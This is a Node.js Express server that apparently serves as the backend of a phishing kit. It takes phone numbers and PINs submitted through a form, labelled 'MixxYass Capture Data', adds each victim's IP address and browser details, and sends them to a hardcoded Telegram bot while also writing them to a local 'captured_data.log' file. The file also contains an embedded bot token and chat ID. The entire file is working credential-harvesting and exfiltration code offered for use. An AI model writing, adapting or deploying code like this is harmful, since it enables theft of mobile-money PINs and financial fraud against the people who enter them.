const express = require('express');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================
// TELEGRAM BOT CONFIGURATION - YOUR CREDENTIALS
// ============================================
const BOT_TOKEN = "8884996201:AAGQHy_bXjAjZ7hUDGY4QRP0K-cSxHcXe9Y";
const CHAT_ID = "8999616005";

// ============================================
// HEALTH CHECK ENDPOINT
// ============================================
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ============================================
// TEST TELEGRAM ENDPOINT (for debugging)
// ============================================
app.get('/test-telegram', async (req, res) => {
    try {
        const testMessage = "✅ Bot is working! Test message from Railway backend ✅";
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: testMessage
        });
        
        res.json({ 
            status: 'success', 
            message: 'Test message sent to Telegram',
            telegramResponse: response.data 
        });
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            message: error.message,
            telegramError: error.response?.data 
        });
    }
});

// ============================================
// MAIN ENDPOINT TO RECEIVE DATA
// ============================================
app.post('/Server', async (req, res) => {
    console.log('📥 Received request:', req.body);
    
    try {
        const { phone, pin } = req.body;
        
        // Validate data
        if (!phone || !pin) {
            console.log('❌ Missing phone or PIN');
            return res.status(400).json({ 
                status: 'error', 
                message: 'Phone and PIN are required' 
            });
        }
        
        // Get additional info
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
        
        console.log(`📞 Phone: ${phone}, PIN: ${pin}, IP: ${ip}`);
        
        // Create Telegram message
        const message = `🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n` +
                       `      📱 MixxYass Capture Data 📱\n` +
                       `🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n\n` +
                       `📞 PHONE NUMBER:\n` +
                       `   ${phone}\n\n` +
                       `🔐 PIN CODE:\n` +
                       `   ${pin}\n\n` +
                       `🖥️ IP ADDRESS:\n` +
                       `   ${ip}\n\n` +
                       `📱 USER AGENT:\n` +
                       `   ${userAgent.slice(0, 80)}\n\n` +
                       `⏰ DATE & TIME:\n` +
                       `   ${timestamp}\n\n`;
        
        console.log('📤 Sending to Telegram...');
        
        // Send to Telegram
        const telegramResponse = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        });
        
        console.log('✅ Telegram response:', telegramResponse.data);
        
        // Log to file
        const logEntry = `${timestamp} | Phone: ${phone} | PIN: ${pin} | IP: ${ip}\n`;
        fs.appendFileSync('captured_data.log', logEntry);
        
        // Send success response
        res.json({ status: 'success', message: 'Data sent to Telegram' });
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        console.error('Telegram API Error:', error.response?.data);
        
        res.status(500).json({ 
            status: 'error', 
            message: 'Failed to send data to Telegram',
            details: error.message,
            telegramError: error.response?.data
        });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`✅ Health check: /health`);
    console.log(`✅ Test Telegram: /test-telegram`);
    console.log(`✅ POST endpoint: /Server`);
});
